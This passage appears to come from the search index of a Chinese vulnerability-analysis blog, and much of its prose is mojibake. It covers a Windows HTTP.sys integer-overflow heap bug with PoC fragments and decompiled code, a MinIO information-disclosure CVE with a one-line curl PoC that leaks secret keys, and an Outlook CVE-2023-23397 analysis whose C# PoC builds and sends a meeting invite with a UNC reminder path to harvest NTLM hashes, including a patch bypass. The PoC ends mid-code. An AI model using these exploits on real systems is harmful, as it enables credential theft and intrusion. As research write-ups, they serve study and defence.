tmp_binding_base = \u0026amp;service_binding; for (int i = 0; i \u0026lt; 0x11; i++) { binding_base_arr[i] = tmp_binding_base; } bind_info.ServiceNames = binding_base_arr; bind_info.NumberOfServiceNames = 0x11; retCode = HttpSetUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;bind_info, 0x20); retCode = HttpQueryUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;data_temp1, 0x140, \u0026amp;return_len); } åœ¨http!UlCopyChannelBindConfigToIrp ä¸‹æ–­ç‚¹ï¼Œè¿è¡ŒPoCï¼Œæ­¤æ—¶è°ƒç”¨æ ˆä¸º\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff889`cd7f76a8 fffff805`7981ae19 HTTP!UlCopyChannelBindConfigToIrp 01 fffff889`cd7f76b0 fffff805`7982caf5 HTTP!UlQueryConfigGroupProperty+0x175 02 fffff889`cd7f7740 fffff805`797130aa HTTP!UlQueryUrlGroupIoctl+0x195 03 fffff889`cd7f77c0 fffff805`6dc954d5 HTTP!UxDeviceControl+0x8a 04 fffff889`cd7f7800 fffff805`6e0a6048 nt!IofCallDriver+0x55 05 fffff889`cd7f7840 fffff805`6e0a5e47 nt!IopSynchronousServiceTail+0x1a8 06 fffff889`cd7f78e0 fffff805`6e0a51c6 nt!IopXxxControlFile+0xc67 07 fffff889`cd7f7a20 fffff805`6de0d8f5 nt!NtDeviceIoControlFile+0x56 08 fffff889`cd7f7a90 00007ff9`c610d1a4 nt!KiSystemServiceCopyEnd+0x25 09 00000014`7dcd6308 00007ff9`b6391b7a ntdll!NtDeviceIoControlFile+0x14 0a 00000014`7dcd6310 00007ff9`b6393c9f HTTPAPI!HttpApiSynchronousDeviceControl+0x8a 0b 00000014`7dcd6390 00007ff6`93fb18b2 HTTPAPI!HttpQueryUrlGroupProperty+0x6f 0c 00000014`7dcd6410 00000000`00000000 http_poc2!wmain+0x3d2 [D:\\code\\c\\http_poc2.c @ 113] http!UlCopyChannelBindConfigToIrp ä¼ªä»£ç å¦‚ä¸‹ï¼Œè¯¥å‡½æ•°è°ƒç”¨UxGetOutputBufferForOutDirect è®¡ç®—å­˜å‚¨ChannelBindConfig æ‰€éœ€çš„å†…å­˜å¤§å°ï¼Œå¹¶å’ŒUxGetOutputBufferForOutDirectè¿”å›çš„åˆ†é…çš„å†…å­˜å¤§å°ä½œæ¯”è¾ƒï¼š\n__int64 __fastcall UlCopyChannelBindConfigToIrp(__int64 a1, IRP *a2, unsigned int *a3) { ... v8 = UlpComputeChannelBindConfigSize(a1, a2); v43 = v8; if ( IoIs32bitProcess(a2) ) { v36 = 0i64; IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (_DWORD)a2, (_DWORD)CurrentStackLocation, 16, 4, (__int64)\u0026amp;v31, (__int64)\u0026amp;v32, (__int64)\u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) != 0 ) { v10 = 43i64; LABEL_6: WPP_SF_D(v10, \u0026amp;WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, 2147483653i64); goto LABEL_32; } goto LABEL_32; } v11 = v31; if ( (*(_DWORD *)a1 \u0026amp; 1) == 0 ) { *(_QWORD *)v31 = 0i64; *(_QWORD *)(v11 + 8) = 0i64; goto LABEL_32; } *(_DWORD *)(v31 + 4) = *(_DWORD *)(a1 + 8); *(_DWORD *)v11 = *(_DWORD *)(a1 + 4); *(_QWORD *)(v11 + 8) = 0i64; v12 = *(_QWORD *)(a1 + 16); if ( !v12 || !*(_DWORD *)(v12 + 16) ) goto LABEL_32; v13 = (v11 + 19) \u0026amp; 0xFFFFFFFFFFFFFFFCui64; v38 = v13; v36 = (_DWORD *)v13; *(_DWORD *)(v11 + 8) = v13 + v32 - v31; *(_DWORD *)(v11 + 12) = *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64); v14 = *(unsigned int *)(*(_QWORD *)(a1 + 16) + 16i64); v15 = (_DWORD *)(v13 + 4 * v14); v37 = v15; v16 = (char *)\u0026amp;v15[3 * v14]; v35 = v16; v17 = 0; v34 = 0; while ( v17 \u0026lt; *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { *(_DWORD *)(v13 + 4i64 * v17) = (_DWORD)v15 + v32 - v31; v18 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 8i64 * v17); if ( *(_DWORD *)v18 == 2 ) { v36 = v15 + 3; v37 = v15 + 3; *v15 = 2; v15[1] = (_DWORD)v16 + v32 - v31; v15[2] = *(_DWORD *)(v18 + 16); memmove(v16, *(const void **)(v18 + 8), *(unsigned int *)(v18 + 16)); v16 = \u0026amp;v35[*(unsigned int *)(v18 + 16)]; } else { v36 = v15 + 3; v37 = v15 + 3; *v15 = 1; v30 = (char *)((unsigned __int64)(v16 + 1) \u0026amp; 0xFFFFFFFFFFFFFFFEui64); v15[1] = (_DWORD)v30 + v32 - v31; v15[2] = *(_DWORD *)(v18 + 16); memmove(v30, *(const void **)(v18 + 8), *(unsigned int *)(v18 + 16)); v16 = \u0026amp;v30[*(unsigned int *)(v18 + 16)]; } v35 = v16; v34 = ++v17; v15 = v36; v13 = v38; } LABEL_31: v3 = v42; goto LABEL_32; } v38 = 0i64; v19 = IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (_DWORD)a2, (_DWORD)CurrentStackLocation, 24, v19 != 0 ? 4 : 8, (__int64)\u0026amp;v31, (__int64)\u0026amp;v32, (__int64)\u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) == 0 ) goto LABEL_32; v10 = 44i64; goto LABEL_6; } if ( v21 \u0026amp;\u0026amp; *(_DWORD *)(v21 + 16) ) { ... while ( v26 \u0026lt; *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { *(_QWORD *)(v22 + 8i64 * v26) = v32 + (unsigned int)(v24 - v31); v27 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 8i64 * v26); if ( *(_DWORD *)v27 == 2 ) { v36 = (_DWORD *)(v24 + 24); v37 = (_DWORD *)(v24 + 24); *(_DWORD *)v24 = 2; *(_QWORD *)(v24 + 8) = v32 + (unsigned int)((_DWORD)v25 - v31); *(_DWORD *)(v24 + 16) = *(_DWORD *)(v27 + 16); memmove(v25, *(const void **)(v27 + 8), *(unsigned int *)(v27 + 16)); v25 = \u0026amp;v35[*(unsigned int *)(v27 + 16)]; } else { v36 = (_DWORD *)(v24 + 24); v37 = (_DWORD *)(v24 + 24); *(_DWORD *)v24 = 1; v28 = (char *)((unsigned __int64)(v25 + 1) \u0026amp; 0xFFFFFFFFFFFFFFFEui64); *(_QWORD *)(v24 + 8) = v32 + (((_DWORD)v25 + 1) \u0026amp; 0xFFFFFFFE) - (unsigned int)v31; *(_DWORD *)(v24 + 16) = *(_DWORD *)(v27 + 16); memmove(v28, *(const void **)(v27 + 8), *(unsigned int *)(v27 + 16));// è§¦å‘æ¼æ´ v25 = \u0026amp;v28[*(unsigned int *)(v27 + 16)]; } v35 = v25; v34 = ++v26; v24 = (__int64)v36; v22 = v39; } goto LABEL_31; } LABEL_32: if ( (int)(OutputBufferForOutDirect + 0x80000000) \u0026lt; 0 || OutputBufferForOutDirect == -2147483643 ) v6 = v8; *v3 = v6; return (unsigned int)OutputBufferForOutDirect; } åœ¨UlpComputeChannelBindConfigSizeå‡½æ•°ä¸­å­˜åœ¨æ•´æ•°æº¢å‡ºï¼Œè¯¥å‡½æ•°ä¼ªä»£ç å¦‚ä¸‹ï¼Œrsi+10hå¤„æŒ‡å‘äº†ç”¨æˆ·ä¼ å…¥çš„HTTP_CHANNEL_BIND_INFOç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š\ntypedef struct _HTTP_CHANNEL_BIND_INFO { HTTP_AUTHENTICATION_HARDENING_LEVELS Hardening; ULONG Flags; PHTTP_SERVICE_BINDING_BASE * ServiceNames; ULONG NumberOfServiceNames; } HTTP_CHANNEL_BIND_INFO, *PHTTP_CHANNEL_BIND_INFO; typedef enum _HTTP_AUTHENTICATION_HARDENING_LEVELS { HttpAuthenticationHardeningLegacy = 0, HttpAuthenticationHardeningMedium, HttpAuthenticationHardeningStrict } HTTP_AUTHENTICATION_HARDENING_LEVELS; typedef struct _HTTP_SERVICE_BINDING_BASE { HTTP_SERVICE_BINDING_TYPE Type; } HTTP_SERVICE_BINDING_BASE, *PHTTP_SERVICE_BINDING_BASE; typedef struct _HTTP_SERVICE_BINDING_A { HTTP_SERVICE_BINDING_BASE Base; PCHAR Buffer; ULONG BufferSize; } HTTP_SERVICE_BINDING_A, *PHTTP_SERVICE_BINDING_A; typedef struct _HTTP_SERVICE_BINDING_W { HTTP_SERVICE_BINDING_BASE Base; PWCHAR Buffer; ULONG BufferSize; } HTTP_SERVICE_BINDING_W, *PHTTP_SERVICE_BINDING_W; __int64 __fastcall UlpComputeChannelBindConfigSize(__int64 a1, IRP *a2) { unsigned int v4; // ebx __int64 v5; // rax __int64 v6; // rdi __int64 v7; // r9 _DWORD *v8; // r8 v4 = IoIs32bitProcess(a2) != 0 ? 16 : 24; if ( (*(_DWORD *)a1 \u0026amp; 1) != 0 ) { v5 = *(_QWORD *)(a1 + 16); if ( v5 ) { if ( *(_DWORD *)(v5 + 16) ) { v6 = 0i64; v4 += (IoIs32bitProcess(a2) != 0 ? 16 : 32) * *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64); if ( *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { do { IoIs32bitProcess(a2); v7 = *(_QWORD *)(a1 + 16); // HTTP_CHANNEL_BIND_INFO ç»“æ„ä½“ v8 = *(_DWORD **)(*(_QWORD *)(v7 + 8) + 8 * v6);// ServiceName ç»“æ„ä½“ if ( *v8 == 1 ) // å¦‚æœæ˜¯HttpServiceBindingTypeW åˆ™è¿›å…¥ v4 = (v4 + 1) \u0026amp; 0xFFFFFFFE; v4 += v8[4]; // V8æ˜¯enum HTTP_SERVICE_BINDING_BASEç±»å‹ï¼Œå 4ä¸ªå­—èŠ‚ï¼Œåˆ™V8[4]å°±æ˜¯V8 åé¢16ä¸ªå­—èŠ‚ï¼Œå³BufferSize v6 = (unsigned int)(v6 + 1); } while ( (unsigned int)v6 \u0026lt; *(_DWORD *)(v7 + 16) ); } } } } return v4; } è¯¥å‡½æ•°éå†HTTP_CHANNEL_BIND_INFOç»“æ„ä½“çš„ServiceNames HTTP_SERVICE_BINDING_WæŒ‡é’ˆæ•°ç»„çš„BufferSizeï¼Œå¹¶ç›¸åŠ ï¼Œè€Œåå°†å…¶è¿”å›ï¼Œå…¶ä¸­v4ä¸ºunsigned intç±»å‹ï¼Œè€ŒBufferSizeä¸ºULONGç±»å‹ï¼Œå‡ä¸ºå››ä¸ªå­—èŠ‚ï¼Œå½“å¾ªç¯ç›¸åŠ æ—¶ï¼Œå¦‚æœBufferSize * NumberOfServiceNames å’Œv4ç›¸åŠ è¶…å‡º0xFFFFFFFFåˆ™ä¼šäº§ç”Ÿæ•´æ•°æº¢å‡ºï¼Œä½¿å¾—UlpComputeChannelBindConfigSizeè¿”å›çš„å†…å­˜å¤§å°å°äºå®é™…æ‰€éœ€çš„å†…å­˜å¤§å°ã€‚åœ¨è°ƒè¯•å™¨ä¸­å¯ä»¥çœ‹åˆ°åœ¨æ‰§è¡Œå®Œfffff805`7984c899 03d9 add ebx, ecxåï¼Œå°†äº§ç”Ÿæº¢å‡ºï¼Œebxå˜ä¸º0x28ã€‚\nè¿”å›åˆ°ä¸Šå±‚å‡½æ•°ï¼ŒUlCopyChannelBindConfigToIrp è°ƒç”¨UxGetOutputBufferForOutDirectè·å–åˆ°ç”¨æˆ·ä¼ å…¥çš„ç¼“å†²åŒºå¤§å°ï¼Œæ­¤æ—¶v41å€¼ä¸º0x140\nretCode = HttpQueryUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;data_temp1, 0x140, \u0026amp;return_len); v43 = v8; if ( IoIs32bitProcess(a2) ) { v36 = 0i64; IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (__int64)a2, (__int64)CurrentStackLocation, 0x10u, 4i64, \u0026amp;v31, \u0026amp;v32, \u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) != 0 ) { v10 = 43i64; LABEL_6: WPP_SF_D(v10, \u0026amp;WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, 2147483653i64); goto LABEL_32; } goto LABEL_32; } ç”±äºåœ¨HTTP!UlpComputeChannelBindConfigSizeä¸­å‘ç”Ÿæ•´æ•°æº¢å‡ºï¼Œå¯¼è‡´HTTP!UlpComputeChannelBindConfigSizeè¿”å›å€¼å°äºç”¨æˆ·æä¾›çš„0x140ï¼Œç»•è¿‡äº†å†…å­˜å¤§å°æ£€æŸ¥ï¼Œåœ¨åé¢é€šè¿‡memcpyå°†HTTP_CHANNEL_BIND_INFOç»“æ„ä½“çš„PHTTP_SERVICE_BINDING_BASEçš„Bufferæˆå‘˜æ‹·è´åˆ°æŒ‡å®šå†…å­˜ä¸­ï¼Œæ‹·è´é•¿åº¦ä¸ºBufferSizeï¼Œå³ç”¨æˆ·æä¾›çš„0xF0F0EF0\n0xF0F0EF0è¿œå¤§äºç”¨æˆ·è¾“å…¥çš„ç¼“å†²åŒº0x1000ï¼Œå¯¼è‡´å †æº¢å‡ºã€‚\nè¡¥ä¸ é€šè¿‡bindiffå¯çŸ¥ï¼Œåœ¨è¡¥ä¸ä¸­å¢åŠ äº†å¯¹BufferSizeè¿›è¡Œåˆ¤æ–­çš„é€»è¾‘ï¼Œåˆ¤æ–­BufferSizeæ˜¯å¦å°äº0xFFFC\nç”±äºServiceNameæœ€å¤§æ•°é‡é™åˆ¶ä¸º0x40ï¼Œåˆ™0x40 * 0xFFFC = 3FFF00ï¼Œä¸èƒ½äº§ç”Ÿæº¢å‡ºï¼Œä¿®å¤äº†è¯¥æ¼æ´ã€‚\nå‚è€ƒèµ„æ–™\nhttps://www.freebuf.com/vuls/364920.html\nCreated at 2023-05-05T20:59:45+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-3156-sudo-eop/","title":"CVE-2021-3156 Sudo æƒé™æå‡æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"Created at 2023-05-05T20:54:20+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/","title":"CVE-2023-28432 MinIO ä¿¡æ¯æ³„éœ²æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Minioæ˜¯ä¸€ä¸ªå¤šäº‘å¯¹è±¡å­˜å‚¨æ¡†æ¶ã€‚åœ¨ä» RELEASE.2019-12-17T23-16-33Z å¼€å§‹ä¸” RELEASE.2023-03-20T20-16-18Z ä¹‹å‰çš„é›†ç¾¤éƒ¨ç½²ä¸­ï¼ŒMinIO è¿”å›æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼ŒåŒ…æ‹¬â€œMINIO_SECRET_KEYâ€å’Œâ€œMINIO_ROOT_PASSWORDâ€ï¼Œä»è€Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚åˆ†å¸ƒå¼éƒ¨ç½²çš„æ‰€æœ‰ç”¨æˆ·éƒ½ä¼šå—åˆ°å½±å“ã€‚å»ºè®®æ‰€æœ‰ç”¨æˆ·å‡çº§åˆ°å‘å¸ƒç‰ˆæœ¬.2023-03-20T20-16-18Zã€‚\næŒ‡çº¹ web.title=\u0026ldquo;minio\u0026rdquo;\nå½±å“ç‰ˆæœ¬ 2019-12-17t23-16-33z \u0026lt;= Minio \u0026lt; 2023-03-20t20-16-18z\nç¯å¢ƒæ­å»º ä½¿ç”¨Dockerå¯åŠ¨4ä¸ªminioå³å¯ã€‚\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• è¡¥ä¸åˆ†æ å¯¹æ¯”ä¿®å¤ç‰ˆæœ¬å’Œæœªä¿®å¤ç‰ˆæœ¬ https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z\u0026hellip;RELEASE.2023-03-20T20-16-18Zå¯çŸ¥æ¼æ´åœ¨commit https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077ä¿®å¤ï¼ŒæŸ¥çœ‹ä¿®å¤ä»£ç ï¼Œå¯ä»¥çŸ¥é“åœ¨ cmd/bootstrap-peer-server.go#VerifyHandleræ–¹æ³•ä¸­å¢åŠ äº†é‰´æƒé€»è¾‘ï¼š func storageServerRequestValidate(r *http.Request) error { token, err := jwtreq.AuthorizationHeaderExtractor.ExtractToken(r) if err != nil { if err == jwtreq.ErrNoTokenInRequest { return errNoAuthToken } return errMalformedAuth } claims := xjwt.NewStandardClaims() if err = xjwt.ParseWithStandardClaims(token, claims, []byte(globalActiveCred.SecretKey)); err != nil { return errAuthentication } owner := claims.AccessKey == globalActiveCred.AccessKey || claims.Subject == globalActiveCred.AccessKey if !owner { return errAuthentication } if claims.Audience != r.URL.RawQuery { return errAuthentication } requestTimeStr := r.Header.Get(\u0026#34;X-Minio-Time\u0026#34;) requestTime, err := time.Parse(time.RFC3339, requestTimeStr) if err != nil { return errMalformedAuth } utcNow := UTCNow() delta := requestTime.Sub(utcNow) if delta \u0026lt; 0 { delta *= -1 } if delta \u0026gt; DefaultSkewTime { return errSkewedAuthTime } return nil } è€Œ VerifyHandleræ–¹æ³•å¯¹åº”çš„è·¯ç”±åœ¨cmd/bootstrap-peer-server.go#registerBootstrapRESTHandlersæ³¨å†Œï¼Œå¯¹åº”çš„è·¯å¾„ä¸º bootstrapRESTPrefix+bootstrapRESTVersionPrefix + bootstrapRESTMethodVerify\nfunc registerBootstrapRESTHandlers(router *mux.Router) { h := func(f http.HandlerFunc) http.HandlerFunc { return collectInternodeStats(httpTraceHdrs(f)) } server := \u0026amp;bootstrapRESTServer{} subrouter := router.PathPrefix(bootstrapRESTPrefix).Subrouter() subrouter.Methods(http.MethodPost).Path(bootstrapRESTVersionPrefix + bootstrapRESTMethodHealth).HandlerFunc( h(server.HealthHandler)) subrouter.Methods(http.MethodPost).Path(bootstrapRESTVersionPrefix + bootstrapRESTMethodVerify).HandlerFunc( h(server.VerifyHandler)) } minioReservedBucket = \u0026#34;minio\u0026#34; minioReservedBucketPath = SlashSeparator + minioReservedBucket bootstrapRESTPrefix = minioReservedBucketPath + \u0026#34;/bootstrap\u0026#34; const ( bootstrapRESTVersion = \u0026#34;v1\u0026#34; bootstrapRESTVersionPrefix = SlashSeparator + bootstrapRESTVersion ) const ( bootstrapRESTMethodVerify = \u0026#34;/verify\u0026#34; ) ç»¼åˆå¯å¾—ï¼Œè§¦å‘æ¼æ´æ–¹æ³•ä¸ºå‘/minio/bootstrap/v1/verifyæ¥å£å‘é€POSTè¯·æ±‚å³å¯ï¼Œé™¤äº†å¯¹verifyæ¥å£åšé‰´æƒä¹‹å¤–ï¼Œè¡¥ä¸ä¸­è¿˜åœ¨è¾“å‡ºä¸­å»é™¤äº†å¯†é’¥ç­‰æ•æ„Ÿä¿¡æ¯ã€‚ ![[../images/Pasted image 20231007234853.png]]\nPoC\ncurl -X POST http://target/minio/bootstrap/v1/verify å°ç»“ è¿™ä¸ªæ¼æ´åˆ†æèµ·æ¥è¾ƒä¸ºç®€å•ï¼Œç”±äºMinioæ˜¯goå¼€å‘çš„ï¼Œç›´æ¥RCEæ¯”è¾ƒéš¾ï¼Œç›®å‰RCEæ–¹å¼æ˜¯é€šè¿‡ä¿¡æ¯æ³„éœ²è·å–åˆ°ç®¡ç†å‘˜å¯†é’¥ç™»å½•ï¼Œè€Œåæ›¿æ¢æ›´æ–°é“¾æ¥ï¼Œåœ¨ä½¿ç”¨minioè‡ªå¸¦çš„mcå·¥å…·è¿›è¡Œæ›´æ–°ï¼Œå°†å½“å‰minioå®ä¾‹æ›¿æ¢ä¸ºå¸¦æœ‰åé—¨ç‰ˆæœ¬çš„minioï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚\nå‚è€ƒé“¾æ¥\nhttps://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z\u0026hellip;RELEASE.2023-03-20T20-16-18Z\nåˆ›å»ºäº2023-10-06\nCreated at 2023-05-05T20:53:41+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23397-outlook-eop/","title":"CVE-2023-23397 Outlook æƒé™æå‡æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Microsoft Outlook å­˜åœ¨æƒé™æå‡æ¼æ´ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å¯é€šè¿‡å‘å—å®³è€…å‘é€ç‰¹åˆ¶çš„å¸¦æœ‰UNCåœ°å€çš„ç”µå­é‚®ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´ï¼Œå½“å—å®³è€…æ‰€ç”¨çš„outlookå¤„äºæ‰“å¼€çŠ¶æ€æ—¶ï¼Œoutlookæ”¶åˆ°çš„ä¼šè®®æé†’è¿‡æœŸæ—¶ä¼šå°è¯•è¿æ¥æ”»å‡»è€…æŒ‡å®šçš„å¤–éƒ¨ UNC ä½ç½®ã€‚è¿™ä¼šå°†å—å®³è€…çš„Net-NTLMv2 hashæ³„éœ²ç»™æ”»å‡»è€…ï¼Œç„¶åæ”»å‡»è€…å¯ä»¥å°†å…¶ä¸­ç»§åˆ°å¦ä¸€ä¸ªæœåŠ¡ï¼Œè¿›è€Œè·å¾—è¯¥ç”¨æˆ·æƒé™ã€‚\nåœ¨å¾®è½¯å‘å¸ƒçš„è¡¥ä¸ä¸­å¯¹è¯¥æ¼æ´ä¿®å¤ä¸å®Œå…¨ï¼Œåªé™åˆ¶äº†æ‰€ç”¨UNCè·¯å¾„ä¸­ä¸èƒ½å«æœ‰â€.â€ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è¯¸å¦‚\\aaa\\å½¢å¼çš„UNCè·¯å¾„å¯¹å…¶ç»•è¿‡ã€‚\nç»™Exchangeé‚®ç®±å‘é€å¸¦æœ‰ReminderFileParameterå±æ€§å¹¶æŒ‡å‘UNCè·¯å¾„ï¼ŒReminderOverrideè®¾ä¸ºtrueï¼ŒReminderSetè®¾ä¸ºtrueå³å¯è§¦å‘\nå½±å“ç‰ˆæœ¬ ç•¥\nç¯å¢ƒæ­å»º outlook 2016 windows 2019 + ADåŸŸ æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• æ ¹æ®å¾®è½¯æ–‡æ¡£ï¼ŒOutlookä¼šè®®å¯ä»¥è®¾ç½®PidLidReminderFileParameterå’ŒPidLidReminderOverrideå±æ€§ï¼Œå…¶å«ä¹‰åˆ†åˆ«ä¸ºï¼šæŒ‡å®šå®¢æˆ·åœ¨è¯¥å¯¹è±¡çš„æé†’è¿‡æœŸæ—¶åº”æ’­æ”¾çš„å£°éŸ³çš„æ–‡ä»¶åå’ŒOutlookå®¢æˆ·ç«¯æ˜¯å¦åº”è¯¥ä¿ç•™PidLidReminderFileParameterå±æ€§çš„å€¼ã€‚æ”»å‡»è€…åœ¨å‘é€ç»™å—å®³è€…çš„ä¼šè®®é‡Œé¢è®¾ç½®PidLidReminderFileParameterå’ŒPidLidReminderOverrideå±æ€§ï¼Œå½“ä¼šè®®è¿‡æœŸæ—¶outlookä¼šå°è¯•è§£æPidLidReminderFileParameterå±æ€§å¹¶å°è¯•æ’­æ”¾PidLidReminderFileParameteræŒ‡å‘çš„è·¯å¾„çš„å£°éŸ³æ–‡ä»¶(.wav)ï¼Œä½†outlookè§£ææ—¶å¹¶æœªé™åˆ¶PidLidReminderFileParameterå±æ€§æŒ‡å‘çš„æ˜¯æœ¬åœ°æ–‡ä»¶è¿˜æ˜¯ç½‘ç»œæ–‡ä»¶ã€‚\nå³PidLidReminderFileParameterå¯ä»¥æŒ‡å‘ç½‘ç»œå…±äº«æ–‡ä»¶ã€‚æ”»å‡»è€…å°†æ¶æ„ä¼šè®®é‚€è¯·çš„PidLidReminderFileParameterå±æ€§è®¾ä¸ºæ”»å‡»è€…æ§åˆ¶çš„ç³»ç»Ÿå¯¹åº”çš„UNCè·¯å¾„ï¼Œå¹¶å°†PidLidReminderOverrideå±æ€§è®¾ä¸ºtrueï¼Œå°†é‚€è¯·å‘ç»™å—å®³è€…é‚®ç®±ï¼Œå½“å—å®³è€…åœ¨outlookä¸Šç™»å½•äº†é‚®ç®±æ—¶ï¼Œoutlookä¼šè‡ªåŠ¨è·å–è¯¥æ–‡ä»¶ï¼Œå½“è¯¥è·¯å¾„å‚æ•°ä¸ºUNCè·¯å¾„æ—¶ï¼Œoutlookä¼šä»¥è¯¥ç”¨æˆ·èº«ä»½å‘è¿™ä¸ªUNCè·¯å¾„å¯¹åº”çš„ç³»ç»Ÿå‘èµ·NTLMè®¤è¯ï¼Œå°è¯•è·å–UNCè·¯å¾„æŒ‡å‘çš„æ–‡ä»¶ï¼Œæ­¤æ—¶æ”»å‡»è€…å¯ä»¥è·å–åˆ°è¯¥è®¤è¯hashï¼Œå¹¶å°†è¯¥hashä¸­ç»§åˆ°å…¶ä»–æœåŠ¡ä¸Šï¼Œå³å¯è·å–åˆ°å—å®³è€…çš„æƒé™ã€‚\nè¯¥æ¼æ´PoCå…ˆä½¿ç”¨MsgKitåº“ç”Ÿæˆmsgæ–‡ä»¶ï¼ˆoutlooké‚®ä»¶æ ¼å¼ï¼‰ï¼Œè€Œååˆ©ç”¨Asposeåº“è¯»å–msgæ–‡ä»¶å¹¶å°†å…¶ååºåˆ—åŒ–ä¸ºMapiMessageå¯¹è±¡ï¼Œåœ¨å…¶ä¸Šæ·»åŠ ReminderSetå¹¶ç½®ä¸ºtrueï¼Œè€Œåè½¬æ¢ä¸ºMailMessageå¯¹è±¡ï¼Œé€šè¿‡smtpClient.Sendå‘ç»™å—å®³è€…ã€‚ä»è€Œè§¦å‘æ¼æ´ï¼Œè·å–åˆ°å—å®³è€…NTLM hashã€‚ åœ¨å¾®è½¯2023å¹´3æœˆè¡¥ä¸æ—¥ä¸­å¯¹æ­¤æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œä½†æ­¤æ¼æ´ä¿®å¤ä¸å®Œå…¨ï¼Œåªæ˜¯é™åˆ¶äº†PidLidReminderFileParameterå±æ€§å†…ä¸èƒ½å«æœ‰â€.â€ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä½¿ç”¨\\aaa\\å½¢å¼ç»•è¿‡æ­¤è¡¥ä¸ã€‚\nPoC\nusing System; using Aspose.Email.Mapi; using Aspose.Email; using Aspose.Email.Clients.Smtp; namespace MsgKit { class Program { static void Main(string[] args) { string lanPath = @\u0026#34;\\\\server\\test\\\u0026#34;; string saveFilePath = @\u0026#34;saveFilePath\u0026#34;; using (var appoionment = new Appointment( new Sender(\u0026#34;winserver@domain.com\u0026#34;, \u0026#34;Sender\u0026#34;), new Representing(\u0026#34;winserver@domain.com\u0026#34;, \u0026#34;Sender\u0026#34;), \u0026#34;pish\u0026#34;)) { appoionment.Recipients.AddTo(\u0026#34;administrator@domain.com\u0026#34;, \u0026#34;administrator\u0026#34;); appoionment.Subject = \u0026#34;pish\u0026#34;; appoionment.Location = \u0026#34;Virtual\u0026#34;; appoionment.MeetingStart = DateTime.Now.Date; appoionment.MeetingEnd = DateTime.Now.Date.AddHours(2).Date; appoionment.AllDay = true; appoionment.BodyText = \u0026#34;hello, world\u0026#34;; appoionment.BodyHtml = \u0026#34;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;b\u0026gt;hello, pls read it.\u0026lt;/b\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;; appoionment.SentOn = DateTime.UtcNow; appoionment.Importance = MsgKit.Enums.MessageImportance.IMPORTANCE_NORMAL; appoionment.IconIndex = MsgKit.Enums.MessageIconIndex.UnsentMail; appoionment.PidLidReminderFileParameter = lanPath; appoionment.PidLidReminderOverride = false; appoionment.Save(saveFilePath); } var msg = MapiMessage.Load(saveFilePath); msg.SetProperty(KnownPropertyList.ReminderSet, true); msg.SetProperty(KnownPropertyList.ReminderFileParameter, lanPath + \u0026#34;\\a\u0026#34;); msg.SetProperty(KnownPropertyList.ReminderOverride, true); SmtpClient smtpClient = new SmtpClient(); smtpClient.Host = \u0026#34;Host\u0026#34;; smtpClient.Username = \u0026#34;username\u0026#34;; smtpClient.Password = \u0026#34;Password\u0026#34;; smtpClient.Port = 587; smtpClient.SecurityOptions = Aspose.Email.Clients.SecurityOptions.SSLExplicit; try { var options = new MailConversionOptions(); options.KeepOriginalEmailAddresses = true; options.ConvertAsTnef = true; 